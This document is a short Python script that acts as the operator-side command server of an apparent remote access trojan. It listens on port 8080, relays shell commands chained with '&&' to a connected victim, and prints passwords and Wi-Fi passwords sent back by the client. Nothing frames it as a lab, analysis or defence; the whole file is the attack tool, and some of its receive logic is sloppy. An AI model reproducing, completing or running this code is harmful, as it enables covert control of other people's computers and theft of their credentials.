import socket
serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serv.bind(('0.0.0.0', 8080))
serv.listen(5)
while True:
    conn, addr = serv.accept()
    from_client = ''
    while True:
        command = input("Enter your command: ")
        conn.send(command.encode())
        if command == 'cmd':
            situation= '>'
            sum = ''
            cmd_com = input(situation)
            while cmd_com != "q":
                if cmd_com[:2] == "cd":
                    situation = cmd_com [3:]
                sum = sum + cmd_com + "  &&  "
                cmd_com = input(situation + '>')
            sum = sum[0 : -6]
            conn.send(sum.encode())
        if command == "pas":
            pas = []
            string_pas = ""
            count = 0
            counter = conn.recv(4096).decode()
            print(counter)
            for row in counter:
                passward = conn.recv(4096).decode()
                print(passward)
        if command == "give":
            print("password of the wifi: ")
            data = conn.recv(4096).decode()
            print(data)

        else:
            data = conn.recv(4096).decode()
            print(data)

    conn.close()
    print ('client disconnected')